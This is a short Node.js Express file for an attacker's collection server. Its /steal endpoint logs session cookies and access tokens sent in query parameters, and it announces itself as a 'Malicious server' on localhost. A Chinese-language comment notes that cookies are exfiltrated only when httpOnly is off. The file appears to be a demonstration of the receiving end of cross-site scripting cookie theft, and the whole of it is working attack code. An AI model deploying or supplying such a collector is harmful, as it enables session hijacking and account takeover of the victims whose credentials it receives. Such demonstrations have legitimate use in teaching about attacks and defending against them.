const express = require("express");
const app = express();
const port = 7000;

app.get("/steal", (req, res) => {
  const stolenCookie = req.query.cookie;
  if (stolenCookie) {
    // Cookie需要是httpOnly是关闭状态下才能发出来
    console.log(`Stolen Cookie: ${stolenCookie}`);
  }
  const stolenAccessToken = req.query.accessToken;
  if (stolenAccessToken) {
    console.log(`Stolen AccessToken: ${stolenAccessToken}`);
  }
  res.send("Cookie received");
});

app.listen(port, () => {
  console.log(`Malicious server listening at http://localhost:${port}`);
});
